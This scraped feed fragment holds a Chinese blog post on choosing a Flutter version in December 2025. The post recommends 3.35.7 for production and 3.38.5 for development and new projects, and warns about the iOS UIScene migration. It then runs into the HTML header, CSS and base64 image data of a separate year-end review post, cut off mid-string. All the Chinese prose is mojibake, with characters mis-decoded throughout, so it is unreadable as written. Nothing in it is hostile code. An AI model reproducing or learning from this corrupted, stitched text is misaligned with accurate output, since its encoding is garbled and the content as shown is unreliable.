<p>è½¬çœ¼åˆ°äº†2025å¹´çš„æœ€åä¸€ä¸ªæœˆã€‚ä¸Šä¸ªæœˆå‘å¸ƒçš„Flutter 3.38å¼•èµ·äº†ä¸å°‘è®¨è®ºï¼Œå°¤å…¶æ˜¯iOSç«¯çš„UISceneé€‚é…é—®é¢˜ã€‚</p>
<p>12æœˆï¼ŒFlutterå®˜æ–¹å‘å¸ƒäº† <strong>3.38.5</strong> è¡¥ä¸ç‰ˆæœ¬ã€‚</p>
<p>å¾ˆå¤šåŒå­¦é—®ï¼š<em>â€œ3.38å‡ºäº†è¡¥ä¸ç‰ˆï¼Œæ˜¯ä¸æ˜¯ç¨³äº†ï¼Ÿèƒ½ä¸Šç”Ÿäº§äº†å—ï¼Ÿâ€</em></p>
<p>è€åˆ˜ç»“åˆæœ€æ–°çš„å®˜æ–¹åŠ¨æ€å’Œç¤¾åŒºåé¦ˆï¼Œå¸¦ä½ çœ‹çœ‹12æœˆçš„ç‰ˆæœ¬é€‰æ‹©ç­–ç•¥ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€12æœˆFlutterå¤§äº‹ä»¶</h2>
<h3 data-id="heading-1">Flutter 3.38.5 å‘å¸ƒ</h3>
<p>åœ¨3.38æ­£å¼ç‰ˆå‘å¸ƒä¸€ä¸ªæœˆåï¼Œå®˜æ–¹æ¨å‡ºäº†äº”ä¸ªè¡¥ä¸ç‰ˆæœ¬ï¼Œæœ€æ–°çš„æ˜¯3.38.5ã€‚</p>
<p>è¿™ä¸€ä¸ªæœˆï¼Œæ€»å…±6ä¸ªFlutterç‰ˆæœ¬ï¼ŒFlutter å›¢é˜ŸåŸºæœ¬ä¸Šå°±æ˜¯åœ¨<strong>ä¿® Widget Previewer -&gt; å‡ Dart -&gt; ä¿®å„å¹³å°å…¼å®¹æ€§</strong>è¿™ä¸ªå¾ªç¯é‡Œç‹‚å¥”ã€‚</p>
<p>è¿™å…­ä¸ªç‰ˆæœ¬éƒ½ä¿®å¤äº†é‚£äº›bugï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FhlR6tDk5LrtUGIluQpMT5A" target="_blank" title="https://mp.weixin.qq.com/s/hlR6tDk5LrtUGIluQpMT5A" ref="nofollow noopener noreferrer">Flutter 3.38 30å¤©å‘6ä¸ªç‰ˆæœ¬ï¼ŒGoogle ç¨‹åºå‘˜çš„å¤´å‘è¿˜å¥½å—ï¼Ÿ
</a></p>
<hr/>
<h2 data-id="heading-2">äºŒã€Flutteræœ€è¿‘5ä¸ªç‰ˆæœ¬æ·±åº¦è§£æï¼ˆ12æœˆæ›´æ–°ï¼‰</h2>
<h3 data-id="heading-3">1. ç‰ˆæœ¬åˆ—è¡¨</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/46a0d79eecda42d0a1f857678bc36e90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604378&amp;x-signature=rXyhTKIFUTgYCvMMvjxFcByPOP8%3D" alt="" loading="lazy"/></p>
<ol>
<li><strong>Flutter 3.38</strong> (æœ€æ–°ç¨³å®šç‰ˆ) - 2025å¹´12æœˆæ›´æ–°</li>
<li><strong>Flutter 3.35</strong> (æ¨èç”Ÿäº§ç‰ˆ) - 2025å¹´10æœˆæ›´æ–°</li>
<li><strong>Flutter 3.32</strong> - 2025å¹´5æœˆå‘å¸ƒ</li>
<li><strong>Flutter 3.29</strong> - 2025å¹´2æœˆå‘å¸ƒ</li>
<li><strong>Flutter 3.27</strong> - 2024å¹´12æœˆå‘å¸ƒ</li>
</ol>
<h3 data-id="heading-4">2. æ ¸å¿ƒç‰ˆæœ¬åˆ†æ</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42341383c7294ec6be38a5cc87cc4dcc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604378&amp;x-signature=o1xuLqlUgAI74L14eTQ769KGJ%2B4%3D" alt="" loading="lazy"/></p>
<p><strong>Flutter 3.38.5 - è§‚å¯ŸæœŸè¿‡åŠï¼Œé£é™©é™ä½</strong></p>
<p>åˆ«çœ‹30å¤©å·²ç»å‘å¸ƒäº†6ä¸ªç‰ˆæœ¬ï¼Œä½†æ˜¯æ€»ä½“æ¥çœ‹å¯¹å¸¸è§„Appå½±å“è¾ƒå¤§çš„bugä¸å¤šï¼Œä¸»è¦é›†ä¸­åœ¨Widget Previewerå’ŒDartè¯­è¨€çš„ç¨³å®šæ€§ä¸Šã€‚</p>
<p>å› æ­¤å¯ä»¥è®¤ä¸ºFlutter 3.38çš„é£é™©åœ¨é€æ­¥é™ä½ã€‚</p>
<ul>
<li><strong>çŠ¶æ€</strong>ï¼šä»â€œä¸­é£é™©â€è½¬ä¸ºâ€œä¸­ä½é£é™©â€ã€‚</li>
<li><strong>å·¥å…·é“¾å‡çº§</strong>ï¼šiOS å¼•å…¥ UIScene ç”Ÿå‘½å‘¨æœŸæ”¯æŒï¼Œæ—§å·¥ç¨‹éœ€æŒ‰æŒ‡å—è¿ç§»ï¼›Android é»˜è®¤ NDK å‡è‡³ r28ï¼Œæ»¡è¶³ Google Play 16 KB é¡µé¢å¤§å°å…¼å®¹è¦æ±‚ã€‚</li>
<li><strong>æ¸²æŸ“ä¸æ€§èƒ½</strong>ï¼šWebä¸ç§»åŠ¨ç«¯æœ‰ä¼˜åŒ–ï¼Œå»ºè®®ç”¨çœŸæœºä¸çº¿ä¸Šæ•°æ®åšå¯¹æ¯”ã€‚</li>
<li><strong>ç”Ÿæ€é€‚é…</strong>ï¼šç¬¬ä¸‰æ–¹æ’ä»¶ä¸åº“é€šå¸¸éœ€è¦1â€“3å‘¨å®Œæˆé€‚é…ã€‚</li>
<li><strong>å»ºè®®</strong>ï¼šå»ºè®®ç­‰å¾…ä¸‰æ–¹åº“é€‚é…ï¼ŒåŒæ—¶è§‚å¯Ÿç¤¾ç¾¤åé¦ˆ</li>
</ul>
<p><strong>Flutter 3.35.7 - åšå¦‚ç£çŸ³</strong></p>
<ul>
<li><strong>çŠ¶æ€</strong>ï¼š<strong>ç”Ÿäº§ç¯å¢ƒé¦–é€‰</strong>ã€‚</li>
<li><strong>æ”¹è¿›</strong>ï¼šä¿®å¤äº†ç‰¹å®šåœºæ™¯ä¸‹çš„å†…å­˜æ³„æ¼é—®é¢˜ã€‚</li>
<li><strong>è¯„ä»·</strong>ï¼šç›®å‰æœ€â€œçœå¿ƒâ€çš„ç‰ˆæœ¬ã€‚å¦‚æœä½ ä¸æƒ³æŠ˜è…¾ç¯å¢ƒï¼Œåªæƒ³å®‰å®‰é™é™å†™ä»£ç ï¼Œé€‰å®ƒæ²¡é”™ã€‚</li>
</ul>
<p><strong>Flutter 3.27 - é«˜é£é™©ç‰ˆæœ¬ï¼Œéœ€è°¨æ…è¯„ä¼°</strong></p>
<ul>
<li><strong>Impelleræ¸²æŸ“å¼•æ“ç¨³å®šæ€§é—®é¢˜</strong>ï¼šæ–°æ¸²æŸ“å¼•æ“åœ¨éƒ¨åˆ†è®¾å¤‡ä¸Šå­˜åœ¨é—®é¢˜
<ul>
<li>éƒ¨åˆ†Androidè®¾å¤‡å‡ºç°èŠ±å±ã€é»‘å±ç°è±¡ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li>
<li>å¼€å‘ç¯å¢ƒæ¨¡æ‹Ÿå™¨æ€§èƒ½ä¸‹é™ï¼Œå½±å“å¼€å‘æ•ˆç‡</li>
<li>å¯é€šè¿‡ <code>--no-enable-impeller</code> å‚æ•°ç¦ç”¨æ–°æ¸²æŸ“å¼•æ“</li>
</ul>
</li>
<li><strong>ç¤¾åŒºåé¦ˆ</strong>ï¼šRedditç­‰å¹³å°æœ‰ç”¨æˆ·æŠ¥å‘Šè“å±å’Œå†»ç»“é—®é¢˜</li>
</ul>
<hr/>
<h2 data-id="heading-5">ä¸‰ã€12æœˆç‰ˆæœ¬é€‰æ‹©å»ºè®®</h2>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6e48d13f51c24d328f94d915dc5e0908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP5ZGY6ICB5YiY:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767604378&amp;x-signature=cG3BCiAIgQrZku8aeQbPNlu6HJ0%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-6"><strong>ç”Ÿäº§ç¯å¢ƒï¼ˆStable Productionï¼‰</strong></h4>
<ul>
<li><strong>é¦–é€‰</strong>ï¼š<strong>Flutter 3.35.7</strong></li>
<li><strong>ç†ç”±</strong>ï¼šç»è¿‡äº†7ä¸ªå°ç‰ˆæœ¬çš„è¿­ä»£ï¼Œ3.35å·²ç»æ‰«æ¸…äº†ç»å¤§éƒ¨åˆ†éšœç¢ã€‚å¯¹äºè¿½æ±‚æè‡´ç¨³å®šçš„å•†ä¸šAppï¼Œå®ƒæ˜¯ç›®å‰å”¯ä¸€çš„é€‰æ‹©ã€‚</li>
<li><strong>ä½•æ—¶é€‰3.38ï¼Ÿ</strong>ï¼šå¦‚æœä½ çš„Appæ€¥éœ€ <strong>Google Play 16 KB é¡µé¢å¤§å°å…¼å®¹</strong>ï¼ˆAndroidï¼‰æˆ–è€…éå¸¸ä¾èµ– <strong>Widget Previewer</strong> è¿›è¡Œå¼€å‘ï¼Œä¸”å›¢é˜Ÿæœ‰èƒ½åŠ›å¤„ç†iOSçš„<code>UIScene</code>è¿ç§»ï¼Œå¯ä»¥å°èŒƒå›´ç°åº¦3.38.5ã€‚</li>
</ul>
<h4 data-id="heading-7"><strong>å¼€å‘ç¯å¢ƒï¼ˆDevelopmentï¼‰</strong></h4>
<ul>
<li><strong>æ¨è</strong>ï¼š<strong>Flutter 3.38.5</strong></li>
<li><strong>ç†ç”±</strong>ï¼šå¼€å‘ç¯å¢ƒåº”è¯¥ç¨å¾®æ¿€è¿›ä¸€ç‚¹ã€‚3.38.5å¸¦æ¥çš„å¼€å‘å·¥å…·é“¾æ›´æ–°ï¼ˆç‰¹åˆ«æ˜¯DevToolså’Œé¢„è§ˆå™¨ï¼‰èƒ½æ˜¾è‘—æå‡æ•ˆç‡ã€‚</li>
<li><strong>ç­–ç•¥</strong>ï¼šæœ¬åœ°ç”¨3.38å¼€å‘ï¼ŒCI/CDæ‰“åŒ…æœºæš‚æ—¶ä¿æŒ3.35ï¼ˆéœ€æ³¨æ„APIå…¼å®¹æ€§ï¼Œé¿å…ä½¿ç”¨3.38ç‹¬æœ‰çš„APIï¼‰ã€‚<em>æ³¨ï¼šå¦‚æœAPIæœ‰å·®å¼‚ï¼Œå»ºè®®æœ¬åœ°ä¹Ÿå›é€€åˆ°3.35ä»¥ä¿ä¸€è‡´æ€§ï¼Œæˆ–è€…ä½¿ç”¨FVMç®¡ç†å¤šç‰ˆæœ¬ã€‚</em></li>
</ul>
<h4 data-id="heading-8"><strong>æ–°é¡¹ç›®å¯åŠ¨ï¼ˆNew Projectï¼‰</strong></h4>
<ul>
<li><strong>æ¨è</strong>ï¼š<strong>Flutter 3.38.5</strong></li>
<li><strong>ç†ç”±</strong>ï¼šæ–°é¡¹ç›®æ²¡æœ‰å†å²åŒ…è¢±ï¼Œç›´æ¥ä»3.38å¼€å§‹é€‚é…<code>UIScene</code>å’ŒAndroidæ–°ç‰¹æ€§ï¼Œé¿å…æœªæ¥å‡ ä¸ªæœˆåˆè¦è¿›è¡Œç¹ççš„è¿ç§»å·¥ä½œã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-9">å››ã€å‡çº§é¢„è­¦ï¼šiOS UIScene</h2>
<p>åœ¨3.38åŠä»¥ä¸Šç‰ˆæœ¬ï¼ŒiOSçš„å·¥ç¨‹æ¨¡ç‰ˆå‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><strong>å¦‚æœä½ æ˜¯ä»æ—§ç‰ˆæœ¬å‡çº§ä¸Šæ¥ï¼š</strong></p>
<ol>
<li>æ£€æŸ¥ <code>ios/Runner/Info.plist</code>ï¼Œç¡®è®¤æ˜¯å¦éœ€è¦æ·»åŠ  <code>UIApplicationSceneManifest</code> é…ç½®ã€‚</li>
<li>æ£€æŸ¥ <code>AppDelegate.swift</code>ï¼Œç¡®è®¤ <code>FlutterAppDelegate</code> çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•æ˜¯å¦è¿˜èƒ½æ­£å¸¸è§¦å‘ã€‚</li>
</ol>
<p>å®˜æ–¹æ–‡æ¡£å·²ç»æ›´æ–°äº†è¯¦ç»†çš„è¿ç§»æŒ‡å—ï¼Œå»ºè®®å‡çº§å‰ä»”ç»†é˜…è¯»ã€‚</p>
<hr/>
<h2 data-id="heading-10">æ€»ç»“</h2>
<p>12æœˆçš„å…³é”®è¯æ˜¯ <strong>â€œç¨³ä¸­æ±‚è¿›â€</strong>ã€‚</p>
<ul>
<li><strong>ç¨³</strong>ï¼š3.35.7 å®ˆä½ç”Ÿäº§ç¯å¢ƒçš„åŸºæœ¬ç›˜ã€‚</li>
<li><strong>è¿›</strong>ï¼š3.38.5 å·²ç»ä¿®å¤äº†å¤§é‡Bugï¼Œæ–°é¡¹ç›®å¯ä»¥å¤§èƒ†å°é²œã€‚</li>
</ul>
<p>è¿˜æ˜¯é‚£å¥è€è¯ï¼š<strong>ä¸è¦ä¸ºäº†å‡çº§è€Œå‡çº§ï¼Œç‰ˆæœ¬æœåŠ¡äºä¸šåŠ¡ã€‚</strong></p>
<blockquote>
<p>å¦‚æœçœ‹åˆ°è¿™é‡Œçš„åŒå­¦å¯¹å®¢æˆ·ç«¯æˆ–è€…Flutterå¼€å‘æ„Ÿå…´è¶£ï¼Œæ¬¢è¿è”ç³»è€åˆ˜ï¼Œæˆ‘ä»¬äº’ç›¸å­¦ä¹ ã€‚</p>
<p>ç§ä¿¡å…è´¹é¢†è€åˆ˜æ•´ç†çš„ã€ŠFlutterå¼€å‘æ‰‹å†Œã€‹ï¼Œè¦†ç›–90%åº”ç”¨å¼€å‘åœºæ™¯ã€‚</p>
<p>å¯ä»¥ä½œä¸ºFlutterå­¦ä¹ çš„çŸ¥è¯†åœ°å›¾ã€‚</p>
<p>â€”â€” laoliu_dev</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ“– æ¯ä¸€ä»½æ”¶è·éƒ½å€¼å¾—è¢«çºªå¿µï¼šå°ä½•çš„ 2025 å¹´åº¦æ€»ç»“]]></title>    <link>https://juejin.cn/post/7589074117643960355</link>    <guid>https://juejin.cn/post/7589074117643960355</guid>    <pubDate>2025-12-29T09:01:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117643960355" data-draft-id="7589093939655835700" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ“– æ¯ä¸€ä»½æ”¶è·éƒ½å€¼å¾—è¢«çºªå¿µï¼šå°ä½•çš„ 2025 å¹´åº¦æ€»ç»“"/> <meta itemprop="keywords" content="å¹´ç»ˆæ€»ç»“,å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:01:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="xiaohe0601"/> <meta itemprop="url" content="https://juejin.cn/user/3183831378302871"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ“– æ¯ä¸€ä»½æ”¶è·éƒ½å€¼å¾—è¢«çºªå¿µï¼šå°ä½•çš„ 2025 å¹´åº¦æ€»ç»“
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3183831378302871/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    xiaohe0601
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:01:09.000Z" title="Mon Dec 29 2025 09:01:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC